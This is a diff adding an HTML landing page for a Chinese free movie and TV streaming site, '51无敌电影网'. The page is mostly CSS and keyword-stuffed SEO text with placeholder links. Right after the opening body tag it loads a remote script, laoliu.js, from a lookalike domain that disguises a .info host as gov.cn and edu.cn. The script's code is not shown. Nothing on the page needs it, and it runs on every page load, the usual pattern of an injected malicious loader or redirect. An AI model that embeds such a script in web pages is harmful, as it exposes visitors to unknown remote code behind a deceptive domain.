@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>51无敌电影网 - 海量高清电影免费在线观看</title>
+<meta name="description" content="51无敌电影网(51wudidianyingwang-h5)提供最新高清电影、热播电视剧、动漫综艺在线观看，资源丰富、更新及时，手机电脑均可流畅访问。">
+<meta name="keywords" content="51无敌电影网, 无敌电影网, 电影在线观看, 高清电影, 51wudidianyingwang-h5">
+<meta name="author" content="51无敌电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://51wudidianyingwang-h5">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "PingFang SC", "Microsoft YaHei", "Helvetica Neue", Arial, sans-serif;
+}
+
+body {
+    background: #f4f6f9;
+    color: #2c3e50;
+    line-height: 1.8;
+    -webkit-font-smoothing: antialiased;
+}
+
+a {
+    color: #e63946;
+    text-decoration: none;
+    transition: color 0.2s;
+}
+
+a:hover {
+    color: #c1121f;
+}
+
+img {
+    max-width: 100%;
+    display: block;
+}
+
+.container {
+    width: 92%;
+    max-width: 1180px;
+    margin: 0 auto;
+}
+
+/* ===== 顶部通知条 ===== */
+.topbar {
+    background: #e63946;
+    color: #fff;
+    text-align: center;
+    font-size: 13px;
+    padding: 8px 0;
+}
+
+.topbar a {
+    color: #ffe3e3;
+    text-decoration: underline;
+}
+
+/* ===== 头部 ===== */
+header {
+    background: #fff;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+    padding: 26px 0;
+    text-align: center;
+}
+
+header .logo {
+    font-size: 34px;
+    font-weight: 800;
+    color: #e63946;
+    letter-spacing: 1px;
+}
+
+header .logo span {
+    color: #457b9d;
+}
+
+header .slogan {
+    font-size: 14px;
+    color: #8d99ae;
+    margin-top: 6px;
+}
+
+header .url {
+    display: inline-block;
+    margin-top: 10px;
+    font-size: 13px;
+    color: #fff;
+    background: #457b9d;
+    padding: 4px 16px;
+    border-radius: 20px;
+}
+
+/* ===== 导航 ===== */
+nav {
+    background: #fff;
+    border-top: 1px solid #eef1f5;
+    border-bottom: 3px solid #e63946;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+}
+
+nav ul {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    list-style: none;
+}
+
+nav ul li {
+    margin: 0;
+}
+
+nav ul li a {
+    display: block;
+    padding: 14px 22px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #2c3e50;
+    border-bottom: 3px solid transparent;
+    margin-bottom: -3px;
+}
+
+nav ul li a:hover {
+    color: #e63946;
+    border-bottom-color: #e63946;
+    background: #fdf2f2;
+}
+
+/* ===== 通用栏目 ===== */
+.section {
+    padding: 56px 0;
+}
+
+.section-title {
+    text-align: center;
+    margin-bottom: 36px;
+}
+
+.section-title h2 {
+    font-size: 26px;
+    color: #e63946;
+    display: inline-block;
+    position: relative;
+    padding-bottom: 10px;
+}
+
+.section-title h2::after {
+    content: "";
+    position: absolute;
+    left: 50%;
+    bottom: 0;
+    transform: translateX(-50%);
+    width: 60px;
+    height: 3px;
+    background: #457b9d;
+    border-radius: 2px;
+}
+
+.section-title p {
+    color: #8d99ae;
+    font-size: 14px;
+    margin-top: 10px;
+}
+
+/* ===== Banner ===== */
+.banner {
+    background: linear-gradient(120deg, #a8dadc 0%, #457b9d 100%);
+    color: #fff;
+    border-radius: 16px;
+    padding: 44px 30px;
+    text-align: center;
+    margin-top: 26px;
+}
+
+.banner h2 {
+    font-size: 24px;
+    margin-bottom: 12px;
+}
+
+.banner p {
+    opacity: 0.92;
+    font-size: 15px;
+}
+
+.banner .btn {
+    display: inline-block;
+    margin-top: 18px;
+    background: #e63946;
+    color: #fff;
+    padding: 11px 30px;
+    border-radius: 26px;
+    font-weight: 600;
+}
+
+.banner .btn:hover {
+    background: #c1121f;
+    color: #fff;
+}
+
+/* ===== 标签云卡片 ===== */
+.tags {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 30px;
+}
+
+.tags a {
+    padding: 8px 20px;
+    background: #fff;
+    border: 1px solid #e0e6ed;
+    border-radius: 24px;
+    font-size: 14px;
+    color: #457b9d;
+}
+
+.tags a:hover {
+    background: #e63946;
+    border-color: #e63946;
+    color: #fff;
+}
+
+/* ===== 卡片网格 ===== */
+.grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 22px;
+}
+
+.card {
+    background: #fff;
+    border-radius: 14px;
+    overflow: hidden;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.05);
+    transition: transform 0.25s, box-shadow 0.25s;
+}
+
+.card:hover {
+    transform: translateY(-6px);
+    box-shadow: 0 12px 28px rgba(0,0,0,0.12);
+}
+
+.card .thumb {
+    height: 140px;
+    background: linear-gradient(135deg, #f1faee, #a8dadc);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 46px;
+}
+
+.card .thumb.b2 { background: linear-gradient(135deg, #ffe5d9, #f4a261); }
+.card .thumb.b3 { background: linear-gradient(135deg, #e9ecef, #adb5bd); }
+.card .thumb.b4 { background: linear-gradient(135deg, #d8f3dc, #52b788); }
+
+.card .body {
+    padding: 18px;
+}
+
+.card .body h3 {
+    font-size: 18px;
+    margin-bottom: 8px;
+    color: #2c3e50;
+}
+
+.card .body p {
+    font-size: 13px;
+    color: #8d99ae;
+    margin-bottom: 14px;
+}
+
+.card .body a.more {
+    font-size: 13px;
+    font-weight: 600;
+    color: #e63946;
+    border-bottom: 1px dashed #e63946;
+    padding-bottom: 2px;
+}
+
+/* ===== 列表 ===== */
+.list {
+    background: #fff;
+    border-radius: 14px;
+    padding: 20px 26px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.05);
+}
+
+.list .item {
+    display: flex;
+    align-items: center;
+    padding: 14px 0;
+    border-bottom: 1px dashed #eef1f5;
+}
+
+.list .item:last-child {
+    border-bottom: none;
+}
+
+.list .num {
+    flex: 0 0 34px;
+    height: 34px;
+    line-height: 34px;
+    text-align: center;
+    background: #e63946;
+    color: #fff;
+    border-radius: 50%;
+    font-size: 14px;
+    font-weight: 700;
+    margin-right: 16px;
+}
+
+.list .num.gray { background: #adb5bd; }
+
+.list .txt {
+    flex: 1;
+}
+
+.list .txt strong {
+    display: block;
+    font-size: 15px;
+    color: #2c3e50;
+}
+
+.list .txt span {
+    font-size: 12px;
+    color: #8d99ae;
+}
+
+.list .txt a:hover strong {
+    color: #e63946;
+}
+
+/* ===== 关于 ===== */
+.about-box {
+    background: #fff;
+    border-radius: 14px;
+    padding: 30px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.05);
+}
+
+.about-box p {
+    margin-bottom: 14px;
+    font-size: 15px;
+    color: #495057;
+}
+
+.about-box .kw {
+    background: #fdf2f2;
+    border-left: 4px solid #e63946;
+    padding: 16px 20px;
+    border-radius: 0 8px 8px 0;
+    margin-top: 20px;
+    font-size: 14px;
+    color: #e63946;
+}
+
+/* ===== 底部 ===== */
+footer {
+    background: #1d3557;
+    color: #cdd6e0;
+    padding: 36px 0 20px;
+    margin-top: 40px;
+    font-size: 13px;
+}
+
+footer .fwrap {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 24px;
+    margin-bottom: 26px;
+}
+
+footer h4 {
+    color: #fff;
+    font-size: 15px;
+    margin-bottom: 12px;
+}
+
+footer ul {
+    list-style: none;
+}
+
+footer ul li {
+    margin-bottom: 8px;
+}
+
+footer ul li a {
+    color: #a8dadc;
+}
+
+footer .copy {
+    text-align: center;
+    border-top: 1px solid rgba(255,255,255,0.1);
+    padding-top: 18px;
+    color: #8d99ae;
+    font-size: 12px;
+}
+
+/* ===== 移动端 ===== */
+@media (max-width: 768px) {
+    header .logo { font-size: 26px; }
+    .section { padding: 40px 0; }
+    .section-title h2 { font-size: 22px; }
+    .banner { padding: 32px 20px; }
+    .banner h2 { font-size: 20px; }
+    nav ul li a { padding: 12px 14px; font-size: 14px; }
+    .card .thumb { height: 110px; font-size: 36px; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部通知 -->
+<div class="topbar">
+    欢迎来到 <strong>51无敌电影网</strong>，海量高清影视免费在线观看，官方网址：<a href="#">https://51wudidianyingwang-h5</a>
+</div>
+
+<!-- 头部 -->
+<header>
+    <div class="container">
+        <div class="logo">51<span>无敌电影网</span></div>
+        <div class="slogan">海量影视资源 · 高清流畅 · 免费在线观看</div>
+        <div class="url">官网地址：https://51wudidianyingwang-h5</div>
+    </div>
+</header>
+
+<!-- 导航 -->
+<nav>
+    <div class="container">
+        <ul>
+            <li><a href="#home">首页</a></li>
+            <li><a href="#hot">热门推荐</a></li>
+            <li><a href="#movie">电影频道</a></li>
+            <li><a href="#tv">电视剧</a></li>
+            <li><a href="#about">关于我们</a></li>
+        </ul>
+    </div>
+</nav>
+
+<!-- 首页 -->
+<section class="section" id="home">
+    <div class="container">
+        <div class="banner">
+            <h2>欢迎来到 51无敌电影网</h2>
+            <p>51无敌电影网（51wudidianyingwang-h5）专注提供最新高清电影、热播电视剧、动漫综艺在线观看服务，<br>资源丰富、更新及时，支持手机、平板、电脑自适应访问。</p>
+            <a href="#hot" class="btn">立即观影</a>
+        </div>
+
+        <div class="tags">
+            <a href="#">动作</a>
+            <a href="#">喜剧</a>
+            <a href="#">爱情</a>
+            <a href="#">科幻</a>
+            <a href="#">悬疑</a>
+            <a href="#">战争</a>
+            <a href="#">动画</a>
+            <a href="#">纪录片</a>
+            <a href="#">国产剧</a>
+            <a href="#">美剧</a>
+            <a href="#">韩剧</a>
+        </div>
+    </div>
+</section>
+
+<!-- 热门推荐 -->
+<section class="section" id="hot" style="background:#fff;">
+    <div class="container">
+        <div class="section-title">
+            <h2>热门推荐</h2>
+            <p>51无敌电影网每日精选高热度影视内容，第一时间更新</p>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <div class="thumb">🎬</div>
+                <div class="body">
+                    <h3>院线热映大片</h3>
+                    <p>同步院线最新上映影片，高清画质流畅播放。</p>
+                    <a href="#" class="more">在线观看 ›</a>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb b2">🔥</div>
+                <div class="body">
+                    <h3>本周热播榜</h3>
+                    <p>根据全网热度实时排行，热门好剧一网打尽。</p>
+                    <a href="#" class="more">在线观看 ›</a>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb b3">⭐</div>
+                <div class="body">
+                    <h3>高分经典</h3>
+                    <p>豆瓣高分口碑佳作，值得反复回味的好片。</p>
+                    <a href="#" class="more">在线观看 ›</a>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb b4">🆕</div>
+                <div class="body">
+                    <h3>最新更新</h3>
+                    <p>每日更新最新影视资源，追剧不等待。</p>
+                    <a href="#" class="more">在线观看 ›</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 电影频道 -->
+<section class="section" id="movie">
+    <div class="container">
+        <div class="section-title">
+            <h2>电影频道</h2>
+            <p>51无敌电影网电影频道涵盖多种类型，满足不同观影需求</p>
+        </div>
+
+        <div class="list">
+            <div class="item">
+                <div class="num">1</div>
+                <div class="txt">
+                    <a href="#"><strong>动作电影专区</strong></a>
+                    <span>热血动作、震撼视效，肾上腺素飙升</span>
+                </div>
+            </div>
+            <div class="item">
+                <div class="num">2</div>
+                <div class="txt">
+                    <a href="#"><strong>喜剧爱情专区</strong></a>
+                    <span>轻松浪漫、甜蜜治愈，周末解压首选</span>
+                </div>
+            </div>
+            <div class="item">
+                <div class="num">3</div>
+                <div class="txt">
+                    <a href="#"><strong>科幻悬疑专区</strong></a>
+                    <span>烧脑剧情、视觉奇观，沉浸观影体验</span>
+                </div>
+            </div>
+            <div class="item">
+                <div class="num gray">4</div>
+                <div class="txt">
+                    <a href="#"><strong>战争历史专区</strong></a>
+                    <span>宏大叙事、真实震撼，重温历史瞬间</span>
+                </div>
+            </div>
+            <div class="item">
+                <div class="num gray">5</div>
+                <div class="txt">
+                    <a href="#"><strong>恐怖惊悚专区</strong></a>
+                    <span>心跳加速、紧张刺激，胆量挑战必看</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 电视剧 -->
+<section class="section" id="tv" style="background:#fff;">
+    <div class="container">
+        <div class="section-title">
+            <h2>电视剧频道</h2>
+            <p>热播国产剧、美剧韩剧同步更新，随时随地追剧</p>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <div class="thumb b2">📺</div>
+                <div class="body">
+                    <h3>国产热播剧</h3>
+                    <p>热门国产电视剧第一时间更新，全集在线看。</p>
+                    <a href="#" class="more">立即播放 ›</a>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb b3">🌍</div>
+                <div class="body">
+                    <h3>美剧韩剧</h3>
+                    <p>海外热门剧集中文翻译同步，追剧不掉队。</p>
+                    <a href="#" class="more">立即播放 ›</a>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb b4">🎞️</div>
+                <div class="body">
+                    <h3>网络短剧</h3>
+                    <p>轻松短剧合集，碎片时间也能追完整剧情。</p>
+                    <a href="#" class="more">立即播放 ›</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于我们 -->
+<section class="section" id="about">
+    <div class="container">
+        <div class="section-title">
+            <h2>关于 51无敌电影网</h2>
+            <p>了解我们的服务理念与网站特色</p>
+        </div>
+
+        <div class="about-box">
+            <p><strong>51无敌电影网</strong>（官网：https://51wudidianyingwang-h5）致力于打造一个简洁、稳定、高速的影视在线观看平台，为用户提供海量高清影视资源。</p>
+            <p>网站采用响应式自适应设计，完美兼容手机、平板、电脑等多种设备，无论身在何处，都能随时随地享受流畅的高清影视内容。</p>
+            <p>我们坚持每日更新，覆盖电影、电视剧、动漫、综艺等丰富品类，满足不同用户的观影喜好。</p>
+            <div class="kw">
+                核心关键词：51无敌电影网 · 无敌电影网 · 电影在线观看 · 高清影视 · 51wudidianyingwang-h5
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer>
+    <div class="container">
+        <div class="fwrap">
+            <div>
+                <h4>网站导航</h4>
+                <ul>
+                    <li><a href="#home">首页</a></li>
+                    <li><a href="#hot">热门推荐</a></li>
+                    <li><a href="#movie">电影频道</a></li>
+                    <li><a href="#tv">电视剧</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>影视分类</h4>
+                <ul>
+                    <li><a href="#">动作电影</a></li>
+                    <li><a href="#">喜剧爱情</a></li>
+                    <li><a href="#">科幻悬疑</a></li>
+                    <li><a href="#">国产热播剧</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>关于我们</h4>
+                <ul>
+                    <li><a href="#about">网站简介</a></li>
+                    <li><a href="#">官方网址：https://51wudidianyingwang-h5</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copy">
+            © 2026 51无敌电影网（51wudidianyingwang-h5） 版权所有<br>
+            本站仅提供信息展示服务，所有影视内容均来自互联网
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
